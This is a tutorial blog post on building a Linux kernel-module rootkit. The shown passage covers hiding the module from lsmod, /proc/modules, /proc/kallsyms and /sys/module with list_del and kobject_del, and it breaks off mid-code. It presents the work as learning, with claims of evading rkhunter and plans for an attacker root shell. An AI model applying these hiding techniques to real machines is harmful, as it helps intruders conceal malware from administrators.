<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>How did I approach making linux LKM rootkit, ‚Äúreveng_rtkit‚Äù ? | reveng007‚Äôs Blog</title>
<meta name="generator" content="Jekyll v3.9.2" />
<meta property="og:title" content="How did I approach making linux LKM rootkit, ‚Äúreveng_rtkit‚Äù ?" />
<meta name="author" content="Soumyanil Biswas" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="READING TIME: 53 min." />
<meta property="og:description" content="READING TIME: 53 min." />
<link rel="canonical" href="https://reveng007.github.io/blog/2022/03/08/reveng_rkit_detailed.html" />
<meta property="og:url" content="https://reveng007.github.io/blog/2022/03/08/reveng_rkit_detailed.html" />
<meta property="og:site_name" content="reveng007‚Äôs Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-03-08T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="How did I approach making linux LKM rootkit, ‚Äúreveng_rtkit‚Äù ?" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Soumyanil Biswas"},"dateModified":"2022-03-08T00:00:00+00:00","datePublished":"2022-03-08T00:00:00+00:00","description":"READING TIME: 53 min.","headline":"How did I approach making linux LKM rootkit, ‚Äúreveng_rtkit‚Äù ?","mainEntityOfPage":{"@type":"WebPage","@id":"https://reveng007.github.io/blog/2022/03/08/reveng_rkit_detailed.html"},"url":"https://reveng007.github.io/blog/2022/03/08/reveng_rkit_detailed.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/blog/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://reveng007.github.io/blog/feed.xml" title="reveng007's Blog" /><!-- highlight.js support -->
  <link rel="stylesheet" href="/blog/js/highlightjs/styles/github.css">
  <link rel="stylesheet" href="/blog/js/highlightjs/styles/ssms.css" />

  <script type="text/javascript" src="/blog/js/highlightjs/highlight.min.js"></script>

  <script type="text/javascript" src="/blog/js/highlightjs/languages/plaintext.min.js"></script>
  <script type="text/javascript" src="/blog/js/highlightjs/languages/powershell.min.js"></script>
  <script type="text/javascript" src="/blog/js/highlightjs/languages/tsql.min.js"></script>

  <script type="text/javascript"> hljs.highlightAll(); </script>
  <!-- end highlight.js support -->

  <!-- dark theme using DarkReader -->
  <script src="//unpkg.com/darkreader@4.9.40/darkreader.js"></script>
  <script type="text/javascript">
    DarkReader.setFetchMethod(window.fetch); // Fix to remedy CORS errors in chrome console
    //DarkReader.enable();
    DarkReader.auto( {brightness: 100, contrast: 90, sepia: 10} );
  </script>
</head><body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/blog/">reveng007&#39;s Blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/blog/archive.html">Blog Archive</a><a class="page-link" href="/blog/">Home</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <link href="/blog/css/override.css" rel="stylesheet" type="text/css">
<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">How did I approach making linux LKM rootkit, ‚Äúreveng_rtkit‚Äù ?</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2022-03-08T00:00:00+00:00" itemprop="datePublished">Mar 8, 2022
      </time>
      ‚Ä¢ <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">Soumyanil Biswas</span></span></p>
  </header>

  <div class="share-links">
    <style>
  #share-buttons {display: inline-block; vertical-align: middle; }
  #share-buttons:after {content: ""; display: block; clear: both;}
  #share-buttons > div {position: relative; text-align: left; height: 36px; width: 32px; float: left; text-align: center;}
  #share-buttons > div > svg {height: 16px; fill: #d5d5d5; margin-top: 10px;}
  #share-buttons > div:hover {cursor: pointer;}
  #share-buttons > div.facebook:hover > svg {fill: #3B5998;}
  #share-buttons > div.twitter:hover > svg {fill: #55ACEE;}
  #share-buttons > div.linkedin:hover > svg {fill: #0077b5;}
  #share-buttons > div.gplus:hover > svg {fill: #dd4b39;}
  #share-buttons > div.mail:hover > svg {fill: #7D7D7D;}
  #share-buttons > div.instagram:hover > svg {fill: #C73B92;}
  #share-buttons > div.facebook > svg {height: 18px; margin-top: 9px;}
  #share-buttons > div.twitter > svg {height: 20px; margin-top: 8px;}
  #share-buttons > div.linkedin > svg {height: 19px; margin-top: 7px;}
  #share-buttons > div.pinterest > svg {height: 20px; margin-top: 9px;}
  #share-buttons > div.gplus > svg {height: 17px; margin-top: 9px; position: relative; left: 1px;}
  #share-buttons > div.mail > svg {height: 14px; margin-top: 11px;}
</style>





<span style="color: silver;">Share on: </span><div id="share-buttons">
  <div class="facebook" title="Share this on Facebook"    onclick="window.open('http://www.facebook.com/share.php?u=https%3A%2F%2Freveng007.github.io%2F2022%2F03%2F08%2Freveng_rkit_detailed.html','popup','width=600,height=600'); return false;">
    <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z"/></svg></div>
  <div class="twitter"  title="Share this on Twitter"     onclick="window.open('https://twitter.com/intent/tweet?url=https%3A%2F%2Freveng007.github.io%2F2022%2F03%2F08%2Freveng_rkit_detailed.html&text=How+did+I+approach+making+linux+LKM+rootkit%2C+%E2%80%9Creveng_rtkit%E2%80%9D+%3F&via=reveng007','popup','width=600,height=600'); return false;">
    <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z"/></svg></div>
  <div class="linkedin" title="Share this on Linkedin"    onclick="window.open('https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Freveng007.github.io%2F2022%2F03%2F08%2Freveng_rkit_detailed.html','popup','width=600,height=600'); return false;">
    <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z"/></svg></div>
  <div class="gplus"    title="Share this on Google Plus" onclick="window.open('https://plus.google.com/share?url=https%3A%2F%2Freveng007.github.io%2F2022%2F03%2F08%2Freveng_rkit_detailed.html','popup','width=600,height=600'); return false;">
    <svg viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z"/></svg></div>
  <div class="mail"     title="Share this through Email"  onclick="window.open('mailto:?&body=https%3A%2F%2Freveng007.github.io%2F2022%2F03%2F08%2Freveng_rkit_detailed.html&subject=%5BBlog%5D++-+How+did+I+approach+making+linux+LKM+rootkit%2C+%E2%80%9Creveng_rtkit%E2%80%9D+%3F','popup','width=600,height=600'); return false;">
    <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z"/></svg></div>
</div>
  </div>
  <br>

  <div class="post-content e-content" itemprop="articleBody">
    <h5 id="reading-time-53-min">READING TIME: 53 min.</h5>

<h5 id="github-repo-httpsgithubcomreveng007reveng_rtkit">GitHub repo: <ins><a href="https://github.com/reveng007/reveng_rtkit">https://github.com/reveng007/reveng_rtkit</a></ins></h5>

<h3 id="why-am-i-writing-this-blog">Why am I writing this blog?</h3>
<p>I just wanted to share my experience with all of you guys/gals, which I learned while creating this LKM based rootkit.</p>
<ul>
  <li>How I searched linux kernel source code to come up with an idea of which entry point to access (If you don‚Äôt know entry point please, bare with me, I will late you know).</li>
  <li>How I implemented security concepts along with developing mindset.</li>
  <li>How I applied same concepts that was in market previously, in a different manner, so that my rootkit can bypass antirootkits (till now, it can bypass infamous rkhunter antirootkit).</li>
</ul>

<p>And yes! ofcourse, I have taken help from other resourses like blog posts, YT videos, websites, githubs, etc.</p>

<p>I am just sharing all those techniques, xps (aquired while doing this project) and resourses, in order to avoid all those overhead pains of finding out those appropriate concepts/ snippets, related to this project, from all over the internet world, making things become easy as well as clear to you.</p>

<p>This blog will be pretty big, as I have documented all the informations that I have gathered in the three month period of making this project as well as this blog post. So, our journey will be pretty long. Let‚Äôs buckle up our seat belts! and dive right in the world of LKM üòâ.</p>

<blockquote>
  <p><strong><em>NOTE</em></strong>: If you(viewers) have spotted anything erroneous or something which should be made correct, haven‚Äôt documented correctly or haven‚Äôt credited someone‚Äôs work properly, please don‚Äôt hesitate to reach out to me via those social media handles listed at the end of this file.</p>
</blockquote>

<h3 id="why-did-i-wanted-to-make-this-project-in-the-first-place">Why did I wanted to make this project in the first place?</h3>

<p>Last month, I was just reading about Linux Kernel from a famous book called, ‚ÄúUnderstanding Linux Kernel‚Äù. I was reading but not quite getting all those concepts clearly. So,just like what all programmers say, ‚ÄúIf you are not getting any concept well enough, try to code it.‚Äù There is no such quote out there in the market lol!, I just made it up, but you get the idea, right?</p>

<p>While reading and researching those topics, I found out about Linux kernel Module, device drivers. Actually, I watched <a href="https://www.youtube.com/watch?v=juGNPLdjLH4">LiveOverflow</a> where I was introduced to Linux Device Driver via this website: <a href="https://lwn.net/Kernel/LDD3/">LDD3</a>. I saw that Linux kernel code is full of circular doubly-linked list structures to reduce the amount of duplicated code. But I was totally noob with linked list. I followed this <a href="https://www.youtube.com/watch?v=_jQhALI4ujg">YT video</a> to know the concept of it and <a href="https://www.geeksforgeeks.org/linked-list-set-1-introduction/">geeksforgeeks</a> for knowing how to code simple linked lists. According to me, these would be enough for understanding all those linked lists present in linux kernel.
While doing this, side by side, I was also doing linux function hooking(user mode). From there, it struck me that when it comes to <strong>hooking</strong> in kernel, then <strong>syscall</strong> (aka System call) is the one. From there, I started researching about <code>Syscalls</code> and <code>syscall interception and hooking</code>. Then it again gave me a vision that if we can intercept normal syscall and hook them with our very own custom made syscall, we can easily manipulate the linux kernel, just like the concept of User Mode functional hooking. Manipulating Linux Kernel (or kernel of any OS) can be done by one specfic kind of malware, <strong><em><code>Rootkit</code> !!</em></strong></p>

<p>And as it is related to manipulating linux kernel workings, I threw spotlight over <strong>Linux kernel based rootkit</strong> (aka <strong>Linux Loadable Kernel Module / LKM based rootkit</strong>).</p>

<blockquote>
  <p><strong><em>NOTE</em></strong>: ¬† Those things which are not present online, or some concept which I want to discuss in my very own language, would be discussed in this blog, else I would be sharing links, using which I learned myself.</p>
</blockquote>

<hr />
<hr />
<h2 id="parts">Parts:</h2>
<ol>
  <li>Part1: Basics regrading LKM creation</li>
  <li>Part2: Hiding LKM from <em>lsmod</em>,  <em>/proc/modules</em> file, <em>/proc/kallsyms</em> file and <em>/sys/module/[THIS_MODULE]/</em> directory</li>
  <li>Part3: Revealing LKM from <em>lsmod</em>, <em>/proc/modules</em> file, <em>/proc/kallsyms</em> file and <em>/sys/module/[THIS_MODULE]/</em> directory according to our will</li>
  <li>Part4: Protecting LKM from from being rmmod‚Äôed (or unremovable)</li>
  <li>Part5: Making LKM removable from kernel (Incase needed)</li>
  <li>Part6: Providing rootshell to the attacker</li>
  <li>Part7: Interracting with LKM (which is present in <strong>kernel</strong>) from <strong>Userspace</strong></li>
</ol>

<hr />
<hr />
<h4 id="part1-basics-regrading-lkm-creation">Part1: <ins>Basics regrading LKM creation</ins>:</h4>
<ol>
  <li>LKM creation: I followed <a href="https://www.thegeekstuff.com/2012/04/linux-lkm-basics/">thegeekstuff</a> and pentesteracademy‚Äôs <a href="https://github.com/pentesteracademy/linux-rootkits-red-blue-teams/tree/master/001-helloworld">github-001</a></li>
  <li>Information about <code>print in kernel</code> (aka printk): <a href="https://www.kernel.org/doc/html/latest/core-api/printk-basics.html">kernel.org</a> and pentesteracademy‚Äôs <a href="https://github.com/pentesteracademy/linux-rootkits-red-blue-teams/tree/master/003-helloworld-printk">github-002</a></li>
</ol>

<p>So, if you have followed those links throughly, I think you are good to go.!
We created a LKM which can be run in kernel (we will only use KERN_INFO/pr_info, we won‚Äôt be using KERN_ALERT and KERN_EMERG, etc. in our rootkit LKM ):</p>

<h3 id="note">NOTE:</h3>
<blockquote>
  <p>To follow this blog accurately (i.e. with same linux kernel version: <code>5.11.0-49-generic</code>), you <strong>have</strong> to install custom Linux kernel on your own.</p>
</blockquote>

<p>Otherwise, you can follow this blog with ease, if your linux kernel version is greater than <strong><em>5.7</em></strong>.</p>

<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog1.png?raw=true" alt="" /></p>
<p align="center">
    This is actually the "hello world" code offered by pentester academy.
</p>

<p>Preety much like this, right?</p>

<p>So, we inserted that LKM into kernel, but how can we see it?</p>

<p>There are several methods to see inserted module name in kernel but at first I will show the traditional way of seeing it.</p>
<pre><code>$ lsmod
</code></pre>
<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog2.png?raw=true" alt="" /></p>

<p>Other three methods are:</p>

<ol>
  <li><em><code>/proc/modules</code></em> file (procfs)
    <ul>
      <li>It is actually a virtual filesystem resides in RAM which shows all <strong>User</strong> as well as <strong>Kernel mode</strong> running processes to <em>User mode side users</em>.
<img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog3.png?raw=true" alt="" /></li>
    </ul>
  </li>
  <li><em><code>/proc/kallsyms</code></em> file (procfs)
    <ul>
      <li>Extracts and stores all the non-stack/dynamically loaded kernel modules symbols and builds a data blob that can be linked into that kernel for use by debuggers.</li>
      <li>In other words, it has the whole kernel mapping in one place.</li>
      <li>This means, this file will also store symbols from our already loaded rootkit LKM.
<img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog4.png?raw=true" alt="" /></li>
    </ul>
  </li>
  <li><em><code>/sys/module/[THIS_MODULE]/</code></em> directory (sysfs)
    <ul>
      <li>It is also a virtual filesystem resides in RAM.</li>
      <li>The only difference between sysfs and procfs is the <strong><em>mapping capability</em></strong> of sysfs.</li>
      <li>It maps <ins>kernel subsystem</ins>, <ins>device drivers</ins> in their <ins>hierarchical order</ins>.</li>
      <li>Each entry in <code>/sys</code> is represented by <strong>kobject structure</strong>. Each module has its <ins>own kobject</ins>.
<img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog5.png?raw=true" alt="" /></li>
    </ul>
  </li>
</ol>

<p>So, if we assume our <code>hello world</code> LKM as rootkit, we have to hide it from these <strong>four</strong> areas, right?
Else, if it is visible, it would be easily be seen by Admins., which would make them alert.</p>

<p><strong>NOTE</strong>:</p>
<pre><code>fs =&gt; file system
</code></pre>
<h5 id="so-lets-hide-it">So, let‚Äôs hide it‚Ä¶</h5>
<hr />
<h4 id="part2-hiding-lkm-from-lsmod--procmodules-file-prockallsyms-file-and-sysmodulethis_module-directory">Part2: <ins>Hiding LKM from <em>lsmod</em>,  <em>/proc/modules</em> file, <em>/proc/kallsyms</em> file and <em>/sys/module/[THIS_MODULE]/</em> directory</ins>:</h4>

<p>We can eradicate first <ins>three problems</ins> by simply deleting <strong>our rootkit module</strong> from that <em>structure</em> which is responsible for storing it as a <strong>LKM</strong>.</p>

<p>Before starting the Coding portion, I just want to share one resource with you all. In LKM programming, we all know that we have to use inbuilt linux kernel functions, right?
But how to search for those functions in internet?
There is no online Linux Kernel function documentation present out there in public. You can get few help, if someone individual have written some blog/ posted any query relating to Linux Kernel Programming. Apart from that, there is no other documentations present in web, unlike WinAPI targeting Windows. To mitigate that issue, developers created this website: <a href="https://elixir.bootlin.com/linux/v5.11/source">elixir.bootlin</a> which hosts Linux kernel source codes. This would help programmers to search specific program functions or go through source code of certain kernel modules without any headache. There are also other websites like this, <a href="https://lxr.sourceforge.io/en/index.php">lxr.sourceforge.io</a>, <a href="https://www.gnu.org/software/global/">gnu.org</a> and <a href="https://oracle.github.io/opengrok/">oracle.github.io</a>, but we gonna use this: <a href="https://elixir.bootlin.com/linux/v5.11/source">elixir.bootlin</a>, as found it more handy.</p>

<p>The way to use elixir.bootlin:</p>

<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog6.png?raw=true" alt="" /></p>

<p>You can also use linux local source code which comes prepackaged with very linux distribution. To access those source code, jump move to <code>/lib/modules/&lt;kernel version&gt;/build/include/</code> directory. To search through those would be quite hectic, rather following elixir.bootlin would be my suggesion.</p>

<p>A) <ins>Targeting <em>‚Äúlsmod‚Äù</em>, <em>‚Äú/proc/modules‚Äù</em> file, and <em>‚Äú/proc/kallsyms‚Äù</em> file</ins></p>

<p>Function name, where it is implemented in my project: <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L45">proc_lsmod_hide_rootkit()</a></p>

<p>In header file named <strong><em>‚Äúmodule.h‚Äù</em></strong>, structure named, <strong>struct module</strong> is present, in which there is a member named, <strong>list</strong> (struct list_head list) is defined, which is actually responsible for storing <strong>all list of loaded LKMs</strong>.<br />
We will be deleting our rootkit module from <code>list</code> right? Here, THIS_MODULE is acting as a pointer to a ‚Äúmodule structure‚Äù. Our rootkit module will be represented by THIS_MODULE.</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: module

struct module {
   ...
   /* Member of list of modules */
   struct list_head list;
   ...
};
</code></pre>
<p><code>struct list_head</code> can be found in header file named <strong><em>‚Äúlist.h‚Äù</em></strong>.</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
// elixir.bootlin: pattern: list

struct list_head {
	struct list_head *next, *prev;
};
</code></pre>
<p>We‚Äôre gonna delete our rootkit LKM using <code>list_del()</code>, which is present in the very same header file.</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
// elixir.bootlin: pattern: list

	/**
	 * list_del - deletes entry from list.
	 * @entry: the element to delete from the list.
	 * Note: list_empty() on entry does not return true after this, the entry is
	 * in an undefined state.
	 */
    
static inline void list_del(struct list_head *entry)
{
	__list_del_entry(entry);
	entry-&gt;next = LIST_POISON1;
	entry-&gt;prev = LIST_POISON2;
}
</code></pre>
<p>So,</p>
<pre><code>// parameter to be inputed to list_del():
&amp;THIS_MODULE-&gt;list
</code></pre>
<p>image:
<img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog7.png?raw=true" alt="" /></p>

<blockquote>
  <p>Now we can hide our rootkit LKM from <strong><em><code>lsmod</code></em> command, <em><code>/proc/modules</code></em> file (procfs)</strong> and <strong><em><code>/proc/kallsyms</code></em> file (procfs) !</strong></p>
</blockquote>

<p>B) <ins>Targeting <em>/sys/modules</em> directory</ins></p>

<p>Function name, where it is implemented in my project: <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L85">sys_module_hide_rootkit()</a></p>

<p>Then,<br />
What about <em>‚Äú/sys/module/[THIS_MODULE]/‚Äù</em> directory ?</p>

<p>I searched ‚Äúkobject‚Äù pattern in <em>‚Äú/lib/modules/5.11.0-49-generic/build/include/linux/module.h‚Äù</em> path and I got the structure named, ‚Äú<strong>module_kobject</strong>‚Äù</p>

<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: kobject

struct module {
	...
	/* Sysfs stuff. */
	struct module_kobject mkobj;
	struct module_attribute *modinfo_attrs;
	const char *version;
	const char *srcversion;
	struct kobject *holders_dir;
	...
};
</code></pre>
<p>We can see this very portion of structure named <strong>module</strong> is responsible for <em><code>/* Sysfs stuff. */</code></em>.<br />
So, we became sure <em>‚Äúmodule_kobject‚Äù</em> can be the one.</p>

<p>I searched again but now with ‚Äúmodule_kobject‚Äù pattern in the same path, to see where is this structure used. Fortunately, that very part is documented well enough to save me (=n00b) from eyeballing all around the gigantic <em>‚Äúmodule.h‚Äù</em> file. Although there is no guarantee that I would have become sure that <em>‚Äúmodule_kobject‚Äù</em> gonna be the main point of attraction even after searching through the whole file in absence of documentation.</p>

<p>So, thanks to <ins>Kernel Developers!!!</ins>.</p>

<p>Anyways‚Ä¶</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: module_kobject

struct module_kobject {
	struct kobject kobj;
	struct module *mod;
	struct kobject *drivers_dir;
	struct module_param_attrs *mp;
	struct completion *kobj_completion;
} __randomize_layout;
</code></pre>
<p>So now, we can see that <em>‚Äúmodule_kobject‚Äù</em> has member named <em>‚Äústruct kobject kobj‚Äù</em>.<br />
Lets find out <strong>kobject structure</strong>.</p>

<p>It is present in <em>‚Äú/lib/modules/5.11.0-49-generic/build/include/linux/kobject.h‚Äù</em> path.</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
// elixir.bootlin: pattern: kobject
struct kobject {
	...
	struct list_head        entry;
	...
};
</code></pre>
<p><code>struct list_head</code> can be found in header file named <strong><em>‚Äúlist.h‚Äù</em></strong>.</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
// elixir.bootlin: pattern: list_head

struct  list_head {
	struct list_head *next, *prev;
};
</code></pre>
<p>Again the same case, just like <strong>procfs</strong> and <strong>lsmod</strong> scenario. We will simply delete the <strong>kobject mapping of our rootkit module</strong> from that structure which is responsible for storing it as a LKM kobject.</p>

<p>In header file named <strong><em>‚Äúkobject.h‚Äù</em></strong>, structure named, <strong>struct kobject</strong> is present, in which there is a member named, <strong>entry</strong> (struct list_head entry) is defined, which is actually responsible for storing <strong>kobject mapping caused due to our loaded rootkit LKM</strong>.</p>

<p>We‚Äôre gonna delete 2 things:</p>

<p>a) Delete our rootkit LKM from <strong><code>/sys/module/</code></strong> directory with the help of <code>kobject_del()</code>.<br />
But what will be our <ins>parameter value</ins>?</p>

<p>We will be deleting our module right? It will be expressed by <code>THIS_MODULE</code>. So we will deleting <code>THIS_MODULE</code> in such a way that kobject related to it also gets deleted.</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
// elixir.bootlin: pattern: kobject_del

extern void kobject_del(struct kobject *kobj);
</code></pre>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: module

struct module {
	...
	/* Sysfs stuff. */
	struct module_kobject mkobj;
	...
};
</code></pre>
<pre><code class="language-c">//pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: module_kobject

struct module_kobject {
	struct kobject kobj;
	struct module *mod;
	struct kobject *drivers_dir;
	struct module_param_attrs *mp;
	struct completion *kobj_completion;
} __randomize_layout;
</code></pre>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
// elixir.bootlin: pattern: kobject

struct kobject {
		const char		*name;
		struct list_head	entry;
		struct kobject		*parent;
		struct kset		*kset;
		struct kobj_type	*ktype;
		struct kernfs_node	*sd; /* sysfs directory entry */
		struct kref		kref;
      #ifdef CONFIG_DEBUG_KOBJECT_RELEASE
	      struct delayed_work	release;
      #endif
	      unsigned int state_initialized:1;
	      unsigned int state_in_sysfs:1;
	      unsigned int state_add_uevent_sent:1;
	      unsigned int state_remove_uevent_sent:1;
	      unsigned int uevent_suppress:1;
};
</code></pre>
<pre><code>// parameter to be inputed to kobject_del():
&amp;THIS_MODULE-&gt;mkobj.kobj
</code></pre>
<p>b) Delete the kobject, which is mapped by our rootkit LKM from ‚Äúentry‚Äù list using <code>list_del()</code>. We will be using the same <code>list_del()</code> function that we used before to delete our rootkit LKM from <em><code>lsmod</code></em> command, <em><code>/proc/modules</code></em> file (procfs) and <em><code>/proc/kallsyms</code></em> file (procfs), but this time with different <ins>parameter value</ins>. [source: <a href="https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf">page-6-last-paragraph</a>].</p>

<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
// elixir.bootlin: pattern: entry

struct kobject {
	...
	struct list_head        entry;
	...
};
</code></pre>
<pre><code>//parameter to be inputed to list_del() in this scenario:
/*
* 1. THIS_MODULE
* 2. mkobj
* 3. kobj
* 4. entry
*/

&amp;THIS_MODULE-&gt;mkobj.kobj.entry
</code></pre>

<p>1st three, (1,2,3) are just the same as previous case. Just adding <code>entry</code> in this context.</p>

<blockquote>
  <p>Now we can hide our rootkit LKM from <strong><code>/sys/module/</code></strong> directory (<em>LKM logging directory</em>) !</p>
</blockquote>

<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog8.png?raw=true" alt="" /></p>

<h5 id="but-there-is-a-problem-to-use-this-function-we-cannot-re-enable-our-lkm-rootkit-to-show-mode-again-ie-we-cant-rmmod-the-rootkit-according-to-our-will-the-only-way-left-is-rebooting-the-whole-machine-link-reveng_rtkit-repo-i-will-explain-it-later-in-this-blog">But there is a problem to use this function. We cannot re-enable our LKM rootkit to <code>show</code> mode again, i.e., we can‚Äôt <code>rmmod</code> the rootkit according to our will. The only way left is rebooting the whole machine. link: <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L94">reveng_rtkit repo</a>. I will explain it later in this blog.</h5>

<hr />
<h4 id="part3-revealing-lkm-from-lsmod--procmodules-file-prockallsyms-file-and-sysmodulethis_module-directory-according-to-our-will">Part3: <ins>Revealing LKM from <em>lsmod</em>,  <em>/proc/modules</em> file, <em>/proc/kallsyms</em> file and <em>/sys/module/[THIS_MODULE]/</em> directory according to our will</ins>:</h4>

<p>We have to have our rootkit to be revealed at some point or the other, otherwise we can‚Äôt rmmod or rookit out from kernel. Revealing rootkit means to add the object and kobject related to our LKM module the main list of struct/linkedlist. If, We don‚Äôt add our rootkit module back to the responsible linkedlist, kernel can‚Äôt trace our module, and hence it can‚Äôt rmmod it. If you go through this blog till the end, you wil get my point.</p>

<p>Actually, the purpose of revealing our LKM rootkit is to rmmod the rootkit out of the kernel. We can see it as somewhat of a <strong><em>kill switch button!!!</em></strong>.</p>

<p>A) <ins>Targeting <em>‚Äúlsmod‚Äù</em>, <em>‚Äú/proc/modules‚Äù</em> file, and <em>‚Äú/proc/kallsyms‚Äù</em> file</ins>:</p>

<p>Function name, where it is implemented in my project: <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L125">proc_lsmod_show_rootkit()</a></p>
<ol>
  <li>In <code>proc_lsmod_show_rootkit()</code>, our rootkit module is just added back to main list of modules, where it was previously.</li>
  <li>We will actually store the location of the previously loaded LKM so that we can add our loaded rootkit LKM just after that particular stored location, later according to our need. This also helps to preserve the <ins>Serial order of our rootkit LKM</ins> to avoid suspicion.</li>
</ol>

<p><strong>For adding our loaded <ins>rootkit LKM</ins> back to the main module linked list</strong>:</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
// elixir.bootlin: pattern: list_add
